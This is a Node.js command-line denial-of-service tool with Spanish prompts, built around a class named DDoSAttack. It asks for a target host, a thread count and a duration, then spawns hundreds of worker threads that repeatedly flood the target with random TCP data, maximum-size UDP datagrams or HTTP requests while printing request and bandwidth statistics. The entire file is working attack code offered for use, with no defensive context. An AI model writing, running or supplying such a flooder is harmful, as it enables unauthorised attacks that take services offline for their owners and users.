#!/usr/bin/env node
'use strict';

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const readline = require('readline');
const chalk = require('chalk');
const dns = require('dns/promises');
const url = require('url');
const http = require('http');

class DDoSAttack {
    constructor() {
        this.stats = { total: 0, success: 0, failed: 0, bandwidth: 0 };
        this.workers = [];
        this.methods = ['TCP', 'UDP', 'HTTP'];
        this.startTime = Date.now();
        this.statsInterval = null;
    }

    async start() {
        const target = await this.ask(chalk.greenBright('Objetivo (URL/IP): '));
        const { host, port } = await this.resolveTarget(target);
        const threads = await this.numberBetween(chalk.greenBright('Hilos (100-1000): '), 100, 1000);
        const duration = await this.numberBetween(chalk.greenBright('Duración (segundos): '), 10, 3600);

        this.startAttack(host, port, threads);
        this.showStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    startAttack(target, port, threads) {
        const attack = this.selectAttack(target, port);
        
        for (let i = 0; i < threads; i++) {
            const worker = new Worker(__filename, { 
                workerData: { target, port, attack: attack.toString() }
            });
            
            worker.on('message', (msg) => this.updateStats(msg));
            this.workers.push(worker);
        }
    }

    selectAttack(target, port) {
        return {
            TCP: () => {
                const socket = net.connect(port, target);
                socket.write(crypto.randomBytes(1024));
                socket.on('connect', () => parentPort.postMessage({ 
                    total: 1, success: 1, failed: 0, bandwidth: 1024 
                }));
                socket.on('error', () => parentPort.postMessage({ 
                    total: 1, success: 0, failed: 1, bandwidth: 0 
                }));
            },
            UDP: () => {
                const socket = dgram.createSocket('udp4');
                const payload = crypto.randomBytes(65507);
                socket.send(payload, port, target, () => {
                    parentPort.postMessage({ 
                        total: 1, success: 1, failed: 0, bandwidth: 65507 
                    });
                    socket.close();
                }).on('error', () => parentPort.postMessage({ 
                    total: 1, success: 0, failed: 1, bandwidth: 0 
                }));
            },
            HTTP: () => {
                const req = http.get(`http://${target}:${port}`, () => {
                    parentPort.postMessage({ 
                        total: 1, success: 1, failed: 0, bandwidth: 0 
                    });
                }).on('error', () => {
                    parentPort.postMessage({ 
                        total: 1, success: 0, failed: 1, bandwidth: 0 
                    });
                });
            }
        }[this.methods[Math.floor(Math.random() * this.methods.length)]];
    }

    updateStats(msg) {
        this.stats.total += msg.total || 0;
        this.stats.success += msg.success || 0;
        this.stats.failed += msg.failed || 0;
        this.stats.bandwidth += msg.bandwidth || 0;
    }

    showStats() {
        const render = () => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const rps = elapsed > 0 ? (this.stats.total / elapsed).toFixed(0) : 0;
            const bw = (this.stats.bandwidth / 1024 ** 3).toFixed(3);
            
            readline.clearLine(process.stdout, 0);
            readline.cursorTo(process.stdout, 0);
            
            process.stdout.write(
                chalk`{cyanBright.bold [${elapsed.toFixed(1)}s]} ` +
                chalk`{whiteBright Peticiones:} {greenBright ${this.stats.total}} ` +
                chalk`({greenBright ${this.stats.success}} {whiteBright |} {redBright ${this.stats.failed}}) ` +
                chalk`{yellowBright RPS:} {cyanBright ${rps}} ` +
                chalk`{magentaBright BW:} {cyanBright ${bw}GB}`
            );
        };
        
        this.statsInterval = setInterval(render, 250);
        render();
    }

    async ask(question) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        return new Promise(resolve => {
            rl.question(question, answer => {
                rl.close();
                resolve(answer.trim());
            });
        });
    }

    async numberBetween(question, min, max) {
        let num;
        do num = parseInt(await this.ask(question)) || min;
        while (num < min || num > max);
        return num;
    }

    async resolveTarget(input) {
        try {
            const parsed = new url.URL(input.includes('://') ? input : `http://${input}`);
            const resolved = await dns.lookup(parsed.hostname);
            return { host: resolved.address, port: parsed.port || 80 };
        } catch {
            console.log(chalk.redBright('\n¡Objetivo inválido!'));
            process.exit(1);
        }
    }

    stop() {
        clearInterval(this.statsInterval);
        this.workers.forEach(w => w.terminate());
        console.log(chalk.greenBright('\nAtaque detenido'));
        process.exit();
    }
}

if (!isMainThread) {
    const { target, port, attack } = workerData;
    const attackFn = eval(`(${attack})`);
    setInterval(attackFn, 10);
}

if (isMainThread) {
    new DDoSAttack().start();
}